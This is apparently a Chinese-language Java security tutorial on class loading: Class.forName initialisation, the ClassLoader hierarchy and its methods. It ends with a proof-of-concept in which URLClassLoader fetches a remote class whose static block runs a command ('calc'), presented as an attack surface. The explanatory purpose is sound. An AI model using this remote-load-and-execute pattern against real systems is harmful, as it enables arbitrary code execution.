## 前置知识
### 动态加载类和静态加载的区别
编译时刻加载类就是静态加载类 运行时刻加载类就是动态加载类  
new创建对象 就是静态加载类 在编译时就需要加载所有可能需要用到的类  
`Class.forname()`这种就属于动态加载类 在编译时不报错 在运行到这行代码的时候才会加载到这个类的类类型
建一个demo了解一下
    public class person {
        public String name;
        private  int age;
        public  static  int id ;
        static {
            System.out.println("静态代码块");
        }
        {
            System.out.println("构造代码块");
        }
        public static void staticAction(){
            System.out.println("静态方法");
        }
        public person() {
            System.out.println("无参person");
        }
        public person(String name,int age){
            System.out.println("有参person");
            this.age=age;
            this.name=name;
        }
        public int getAge() {
            return age;
        }
        public void setAge(int age) {
            this.age = age;
        }
    }
可以看到 不管是有参，无参，都会对类进行初始化，每次初始化都会调用到静态代码块之后是构造代码块
给静态变量赋值的时候也会调用静态代码块
加载class 不调用初始化，不会调用代码  
但是，当使用Class.forname的时候 就会进行初始化加载静态代码块
看一下forname的底层代码
在最后看到调用了forname0的方法
和我们需要的不是很一致，向上翻，发现forname的重载方法
可以看到这是native的方法，是使用C++编写的，主要传进去四个参数，类名，是否初始化，类加载器  
我们写一个demo试一下
发现并没有进行初始化  
所以到这里，可以发现，Class.forname其实是可以通过方法的重载，来控制是否进行初始化的。即使进行初始化，也是需要使用到系统的加载器的  
输出一下看一下gs是什么
> 一切的Java类都必须经过JVM加载后才能运行，而ClassLoader的主要作用就是Java类的加载。在JVM类加载器中最顶层的是Bootstrap
> ClassLoader(类引导加载器)、Extension ClassLoader(扩展类加载器)、App
> ClassLoader(系统类加载器)。其中AppClassLoader是默认的类加载器，也就是在不指定加载器的情况下，会自动调用AppClassLoader加载类。同时ClassLoader.getSysytemClassLoader()返回的系统类加载器也是AppClassLoader
关于ClassLoader的一些核心方法
getParent() | 返回该类加载器的父类加载器  
---|---  
loadClass(String name) | 加载指定的Java类，返回的是加载的类的实例  
findClass(String name) | 查找指定的Java类，返回的是加载的类的实例  
findLoadedClass(String name) | 查找JVM已经加载过的类，  
defineClass(String name, byte[] b, int off, int len) |
把字节数组b中的内容转换为Java类，返回的结果是java.lang.Class类的实例，该方法被声明为final  
resolveClass(Class e) | 链接制定的Java类  
在使用loadClass的时候是只进行加载，不进行初始化的
这样我们就可以加载任意类，攻击面也就更广。  
比如使用继承ClassLoader类的URLClassLoader
    import java.net.MalformedURLException;
    import java.net.URL;
    import java.net.URLClassLoader;
    public class ClassLoad {
        public static void main(String[] args) throws ClassNotFoundException, MalformedURLException, InstantiationException, IllegalAccessException {
            URLClassLoader Ul=new URLClassLoader(new URL[]{new URL("http://localhost:9999")});
            Class c = Ul.loadClass("test");
            c.newInstance();
        }
    }
    import java.io.IOException;
    public class test {
        static {
            try {
                Runtime.getRuntime().exec("calc");
            } catch (IOException e) {
                e.printStackTrace();
            }
        }